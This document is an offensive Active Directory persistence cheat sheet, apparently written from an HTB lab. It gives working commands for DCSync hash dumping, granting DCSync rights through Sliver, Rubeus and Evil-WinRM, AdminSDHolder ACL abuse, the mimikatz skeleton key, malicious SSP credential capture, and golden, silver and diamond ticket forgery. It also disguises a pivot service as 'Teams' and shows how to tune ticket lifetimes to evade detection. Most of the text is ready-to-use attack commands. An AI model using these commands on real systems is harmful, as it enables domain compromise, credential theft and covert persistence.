## DCSync
If DCSync perms show as a DACL, we can DCSync and dump hashes

Usage
```bash
proxychains secretsdump.py -just-dc <user>:<pass>@<dc>
```

> No DCSync priv? No problem! Add it (if you can)
### Adding DCSync Priv - Method 1: Rubeus
Once we have DA hash, we can modify stuff in the domain. such as giving other users DCSync privs.

This is all under context of DA Eric
```bash
# TGT Request
sliver rubeus -- asktgt /user:Administrator /d:child.htb.local /rc4:e7d6a507876e2c8b7534143c1c6f28ba /ptt

# Verify
sliver > ls //dc01.child.htb.local/c$

# Pivot to DC
sliver > pivots tcp
sliver > generate --format service -i <internal ip>:9898 --skip-symbols -N psexec-pivot
sliver > psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams <dc_fqdn>

# Use new session
sliver > use <string>

# Add DCSync rights to controlled user
sliver > sharpview -- 'Add-DomainObjectAcl  -PrincipalIdentity <controlled_user> -Rights DCSync'

# DUMP Hashes
proxychains secretsdump.py -just-dc '<controlled_user>:<pass>'@<dc_ip>
```
### Adding DCSync Priv - Method 2: Evil-WinRM
[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) can load scripts from our local workstation to the target one using the `-s`/`--scripts`

```bash
proxychains evil-winrm -i <dc_ip> -u Administrator -H <ntlm> -s .

> PowerView.ps1
> menu           # check commands loaded into module
> Add-DomainObjectAcl  -PrincipalIdentity <controlled_user> -Rights DCSync 

# Dump
proxychains secretsdump.py -just-dc '<controlled_user>:<pass>'@<dc_ip>
```
## AdminSDHolder
[AdminSDHolder](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory) is a unique security principal within Active Directory that protects certain built-in sensitive principals from modification, such as Domain Admins, Enterprise Admins, Schema Admins, etc. 

We can't modify ACL protected by AdminSDHolder, but we CAN modify AdminSDHolder.

Modifying AdminSDHolder
```PowerShell
# Grant Full Control Permission over AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=child,DC=htb,DC=local" -PrincipalIdentity <controlled_user> -Rights All
```
## Skeleton Key
[Skeleton key](https://www.thehacker.recipes/a-d/persistence/skeleton-key) is a technique to bypass authentication by patching the `lsass.exe` process on the domain controller and hijacking the usual NTLM and Kerberos authentication flows.

What does this mean?
	A master password that works with ANY account.

We can use mimikatz to backdoor a skeleton.

> **NOT PERSISTENT AFTER REBOOT**

Creating Skeleton Key
```powershell
# Create skeleton
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Usage?
<user> : mimikatz
```
## Malicious SSP
[Security Support Providers](https://adsecurity.org/?p=1760) (SSPs) are a part of the Windows operating system that offer ways for an application to obtain an authenticated connection. 

We can backdoor custom SSP via mimikatz
```powershell
# Mimikatz
"misk::memssp"
	# Injected =)
```

> Next time when a user logs on, the plaintext password will be contained in the file `C:\Windows\System32\mimilsa.log`.

## ACL Persistence
Some examples
- Grant a low-privileged user with WinRM access to the domain controller
- Grant a low-privileged user with Remote Desktop access to the domain controller
- Grant a low-privileged user with WMI access to the domain controller
- Write permission on a certificate template
- DCSync backdoor
- LAPS backdoor

## Golden Ticket
Golden tickets are forged TGTs signed by `krbtgt` that can be used to impersonate any user.

```powershell
# Dump krbtgt hash
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:domain\krbtgt" "exit"

# Forge golden ticket - impersonating DA
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /aes256:<krbtgt_hash> /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi" "exit"
```

> Because of widespread abuse of it, this has led to heavy monitoring for it. Two common detection techniques are as follows: 1. TGS-REQs that have no corresponding AS-REQ 2. TGTs have a 10-year lifetime (Default lifetime created by Mimikatz). This is why we specified the lifetime as 10 hours.
## Silver Ticket
Silver tickets are forged service tickets. We can impersonate any user to access any service, but only on a specific machine.

```powershell
#Dump computer hash
.\mimikatz.exe "privilege::debug" "lsadump::dcsync" "exit"

# Forgery
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<target_host> /service:<service> /aes256:<computer_hash> /startoffset:0 /endin:600 /renewmax:10080 /ticket:silver.kirbi" "exit"
```

|Access Type|Service|
|---|---|
|`PsExec`|cifs|
|`WMI`|HOST RPCSS|
|`WinRM`|HOST HTTP|
|`Scheduled Tasks`|HOST|
> Compared to a golden ticket, a silver ticket is helpful for a reasonable period (30 days for a computer account by default) of persistence because the computer account password changes every 30 days by default.
## Diamond Ticket
A [diamond ticket](https://www.trustedsec.com/blog/a-diamond-in-the-ruff) is also a TGT that can be used to impersonate any user and access any service in the domain. Made by modifying a LEGITIMATE TGT issued by DC.

Requirements
	A user
	User's RID
	RID of group to impersonate (such as DA, EA, etc...)
	`krbtgt` AES256

```bash
sliver > execute-assembly /path/to/Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<user_RID> /group:<group_RID> /krbkey:<krbtgt_aes> /nowrap
```